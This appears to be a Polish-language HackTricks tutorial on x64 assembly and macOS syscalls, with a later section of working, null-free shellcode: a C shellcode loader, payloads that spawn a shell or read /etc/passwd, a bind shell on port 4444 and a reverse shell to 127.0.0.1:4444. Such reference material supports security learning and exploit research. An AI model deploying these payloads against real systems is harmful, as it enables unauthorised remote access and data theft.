# Wprowadzenie do x64

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakowania, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na GitHubie.

</details>

## **Wprowadzenie do x64**

x64, znany również jako x86-64, to architektura procesora 64-bitowa powszechnie używana w komputerach stacjonarnych i serwerach. Wywodząca się z architektury x86 opracowanej przez Intel, a później przyjęta przez AMD pod nazwą AMD64, jest dominującą architekturą w komputerach osobistych i serwerach obecnie.

### **Rejestry**

x64 rozwija architekturę x86, oferując **16 rejestrów ogólnego przeznaczenia** oznaczonych jako `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi` oraz `r8` do `r15`. Każdy z nich może przechowywać wartość **64-bitową** (8 bajtów). Rejestry te posiadają również podrejestry 32-bitowe, 16-bitowe i 8-bitowe dla kompatybilności i określonych zadań.

1. **`rax`** - Tradycyjnie używany do **wartości zwracanych** z funkcji.
2. **`rbx`** - Często używany jako **rejestr bazowy** do operacji na pamięci.
3. **`rcx`** - Zwykle używany jako **licznik pętli**.
4. **`rdx`** - Używany w różnych rolach, w tym w operacjach arytmetycznych.
5. **`rbp`** - **Wskaźnik bazowy** dla ramki stosu.
6. **`rsp`** - **Wskaźnik stosu**, śledzący górę stosu.
7. **`rsi`** i **`rdi`** - Używane jako indeksy **źródła** i **celu** w operacjach na łańcuchach/pamięci.
8. **`r8`** do **`r15`** - Dodatkowe rejestry ogólnego przeznaczenia wprowadzone w x64.

### **Konwencja wywoływania**

Konwencja wywoływania x64 różni się między systemami operacyjnymi. Na przykład:

* **Windows**: Pierwsze **cztery parametry** są przekazywane w rejestrach **`rcx`**, **`rdx`**, **`r8`** i **`r9`**. Kolejne parametry są umieszczane na stosie. Wartość zwracana znajduje się w **`rax`**.
* **System V (często używany w systemach przypominających UNIX)**: Pierwsze **sześć parametrów całkowitoliczbowych lub wskaźnikowych** jest przekazywanych w rejestrach **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`** i **`r9`**. Wartość zwracana również znajduje się w **`rax`**.

Jeśli funkcja ma więcej niż sześć wejść, **reszta zostanie przekazana na stos**. **RSP**, wskaźnik stosu, musi być **wyrównany do 16 bajtów**, co oznacza, że adres, do którego wskazuje, musi być podzielny przez 16 przed jakimkolwiek wywołaniem. Oznacza to, że zazwyczaj musielibyśmy upewnić się, że RSP jest odpowiednio wyrównany w naszym kodzie shellcode przed wykonaniem wywołania funkcji. Jednak w praktyce wywołania systemowe działają wiele razy nawet jeśli to wymaganie nie jest spełnione.

### Konwencja wywoływania w Swift

Swift ma swoją własną **konwencję wywoływania**, którą można znaleźć pod adresem [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)

### **Powszechne instrukcje**

Instrukcje x64 posiadają bogaty zestaw, zachowując kompatybilność z wcześniejszymi instrukcjami x86 i wprowadzając nowe.

* **`mov`**: **Przenosi** wartość z jednego **rejestru** lub **lokalizacji pamięci** do drugiego.
* Przykład: `mov rax, rbx` — Przenosi wartość z `rbx` do `rax`.
* **`push`** i **`pop`**: Wstawia lub pobiera wartości z/do **stosu**.
* Przykład: `push rax` — Wstawia wartość z `rax` na stos.
* Przykład: `pop rax` — Pobiera najwyższą wartość ze stosu do `rax`.
* **`add`** i **`sub`**: Operacje **dodawania** i **odejmowania**.
* Przykład: `add rax, rcx` — Dodaje wartości w `rax` i `rcx`, przechowując wynik w `rax`.
* **`mul`** i **`div`**: Operacje **mnożenia** i **dzielenia**. Uwaga: mają one określone zachowania dotyczące używania operandów.
* **`call`** i **`ret`**: Używane do **wywoływania** i **powrotu z funkcji**.
* **`int`**: Używane do wywołania oprogramowania **przerwania**. Na przykład `int 0x80` było używane do wywołań systemowych w 32-bitowym x86 Linuxie.
* **`cmp`**: **Porównuje** dwie wartości i ustawia flagi CPU na podstawie wyniku.
* Przykład: `cmp rax, rdx` — Porównuje `rax` z `rdx`.
* **`je`, `jne`, `jl`, `jge`, ...**: **Instrukcje skoku warunkowego**, które zmieniają przepływ sterowania na podstawie wyników poprzedniego `cmp` lub testu.
* Przykład: Po instrukcji `cmp rax, rdx`, `je label` — Skacze do `label`, jeśli `rax` jest równy `rdx`.
* **`syscall`**: Używane do **wywołań systemowych** w niektórych systemach x64 (np. nowoczesne Unixy).
* **`sysenter`**: Zoptymalizowana instrukcja **wywołania systemowego** na niektórych platformach.

### **Prolog Funkcji**

1. **Wstaw stary wskaźnik bazowy**: `push rbp` (zapisuje wskaźnik bazowy wywołującego)
2. **Przenieś bieżący wskaźnik stosu do wskaźnika bazowego**: `mov rbp, rsp` (ustawia nowy wskaźnik bazowy dla bieżącej funkcji)
3. **Zaalokuj miejsce na stosie dla zmiennych lokalnych**: `sub rsp, <rozmiar>` (gdzie `<rozmiar>` to liczba potrzebnych bajtów)

### **Epilog Funkcji**

1. **Przenieś bieżący wskaźnik bazowy do wskaźnika stosu**: `mov rsp, rbp` (dezalokuje zmienne lokalne)
2. **Wyjmij stary wskaźnik bazowy ze stosu**: `pop rbp` (przywraca wskaźnik bazowy wywołującego)
3. **Powrót**: `ret` (zwraca kontrolę do wywołującego)
## macOS

### wywołania systemowe

Istnieją różne klasy wywołań systemowych, możesz je [**znaleźć tutaj**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall\_sw.h)**:**
```c
#define SYSCALL_CLASS_NONE	0	/* Invalid */
#define SYSCALL_CLASS_MACH	1	/* Mach */
#define SYSCALL_CLASS_UNIX	2	/* Unix/BSD */
#define SYSCALL_CLASS_MDEP	3	/* Machine-dependent */
#define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
#define SYSCALL_CLASS_IPC	5	/* Mach IPC */
```
Następnie, możesz znaleźć numer każdego syscalla [**pod tym adresem**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:**
```c
0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
1	AUE_EXIT	ALL	{ void exit(int rval); }
2	AUE_FORK	ALL	{ int fork(void); }
3	AUE_NULL	ALL	{ user_ssize_t read(int fd, user_addr_t cbuf, user_size_t nbyte); }
4	AUE_NULL	ALL	{ user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte); }
5	AUE_OPEN_RWTC	ALL	{ int open(user_addr_t path, int flags, int mode); }
6	AUE_CLOSE	ALL	{ int close(int fd); }
7	AUE_WAIT4	ALL	{ int wait4(int pid, user_addr_t status, int options, user_addr_t rusage); }
8	AUE_NULL	ALL	{ int nosys(void); }   { old creat }
9	AUE_LINK	ALL	{ int link(user_addr_t path, user_addr_t link); }
10	AUE_UNLINK	ALL	{ int unlink(user_addr_t path); }
11	AUE_NULL	ALL	{ int nosys(void); }   { old execv }
12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
[...]
```
Więc aby wywołać syscall `open` (**5**) z klasy **Unix/BSD**, musisz dodać: `0x2000000`

Więc numer syscalla do wywołania open to `0x2000005`

### Shellkody

Aby skompilować:

{% code overflow="wrap" %}
```bash
nasm -f macho64 shell.asm -o shell.o
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
```
{% endcode %}

Aby wyodrębnić bajty:

{% code overflow="wrap" %}
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done

# Another option
otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g'
```
{% endcode %}

<details>

<summary>Kod C do przetestowania shellcode'u</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Powłoka

Pobrane z [**tutaj**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) i wykładane.

{% tabs %}
{% tab title="Shell z adr" %}
```armasm
bits 64
global _main
_main:
call    r_cmd64
db '/bin/zsh', 0
r_cmd64:                      ; the call placed a pointer to db (argv[2])
pop     rdi               ; arg1 from the stack placed by the call to l_cmd64
xor     rdx, rdx          ; store null arg3
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{% endtab %}

{% tab title="z użyciem stosu" %}
```armasm
bits 64
global _main

_main:
xor     rdx, rdx          ; zero our RDX
push    rdx               ; push NULL string terminator
mov     rbx, '/bin/zsh'   ; move the path into RBX
push    rbx               ; push the path, to the stack
mov     rdi, rsp          ; store the stack pointer in RDI (arg1)
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{% endtab %}
{% endtabs %}

#### Odczyt za pomocą polecenia cat

Celem jest wykonanie `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, dlatego drugi argument (x1) to tablica parametrów (które w pamięci oznaczają stos adresów).
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 40         ; Allocate space on the stack similar to `sub sp, sp, #48`

lea rdi, [rel cat_path]   ; rdi will hold the address of "/bin/cat"
lea rsi, [rel passwd_path] ; rsi will hold the address of "/etc/passwd"

; Create inside the stack the array of args: ["/bin/cat", "/etc/passwd"]
push rsi   ; Add "/etc/passwd" to the stack (arg0)
push rdi   ; Add "/bin/cat" to the stack (arg1)

; Set in the 2nd argument of exec the addr of the array
mov rsi, rsp    ; argv=rsp - store RSP's value in RSI

xor rdx, rdx    ; Clear rdx to hold NULL (no environment variables)

push    59      ; put 59 on the stack (execve syscall)
pop     rax     ; pop it to RAX
bts     rax, 25 ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall         ; Make the syscall

section .data
cat_path:      db "/bin/cat", 0
passwd_path:   db "/etc/passwd", 0
```
#### Wywołaj polecenie za pomocą sh
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 32           ; Create space on the stack

; Argument array
lea rdi, [rel touch_command]
push rdi                      ; push &"touch /tmp/lalala"
lea rdi, [rel sh_c_option]
push rdi                      ; push &"-c"
lea rdi, [rel sh_path]
push rdi                      ; push &"/bin/sh"

; execve syscall
mov rsi, rsp                  ; rsi = pointer to argument array
xor rdx, rdx                  ; rdx = NULL (no env variables)
push    59                    ; put 59 on the stack (execve syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

_exit:
xor rdi, rdi                  ; Exit status code 0
push    1                     ; put 1 on the stack (exit syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

section .data
sh_path:        db "/bin/sh", 0
sh_c_option:    db "-c", 0
touch_command:  db "touch /tmp/lalala", 0
```
#### Powłoka powiązana

Powłoka powiązana z [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) na **porcie 4444**
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xffffffffa3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; bind(host_sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x68
syscall

; listen(host_sockid, 2)
xor  rsi, rsi
mov  sil, 0x2
mov  rax, r8
mov  al, 0x6a
syscall

; accept(host_sockid, 0, 0)
xor  rsi, rsi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x1e
syscall

mov rdi, rax
mov sil, 0x3

dup2:
; dup2(client_sockid, 2)
;   -> dup2(client_sockid, 1)
;   -> dup2(client_sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
mov  rax, r8
mov  al, 0x3b
syscall
```
#### Odwrócony Shell

Odwrócony shell dostępny pod adresem [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html). Odwrócony shell do **127.0.0.1:4444**
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xfeffff80a3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; connect(sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x62
syscall

xor rsi, rsi
mov sil, 0x3

dup2:
; dup2(sockid, 2)
;   -> dup2(sockid, 1)
;   -> dup2(sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x3b
syscall
```
<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF** sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
